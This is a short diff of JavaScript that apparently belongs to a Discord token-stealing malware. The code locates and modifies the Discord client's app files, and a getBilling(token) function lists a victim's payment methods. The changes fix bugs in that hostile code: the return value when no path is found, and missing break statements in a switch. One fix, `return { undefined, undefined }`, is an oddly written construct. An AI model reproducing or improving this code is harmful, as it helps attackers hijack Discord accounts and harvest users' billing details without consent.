@@ -76,12 +76,12 @@ const discordPath = (function () {
   }
 
   if (fs.existsSync(resourcePath)) return { resourcePath, app };
-  return "", "";
+  return { undefined, undefined };
 })();
 
 function updateCheck() {
   const { resourcePath, app } = discordPath;
-  if (resourcePath === "" || app === "") return;
+  if (resourcePath === undefined || app === undefined) return;
   const appPath = path.join(resourcePath, "app");
   const packageJson = path.join(appPath, "package.json");
   const resourceIndex = path.join(appPath, "index.js");
@@ -170,8 +170,10 @@ const getBilling = async (token) => {
       switch (x.type) {
         case 1:
           billing += "💳 ";
+          break;
         case 2:
           billing += "<:paypal:951139189389410365> ";
+          break;
       }
     }
   });
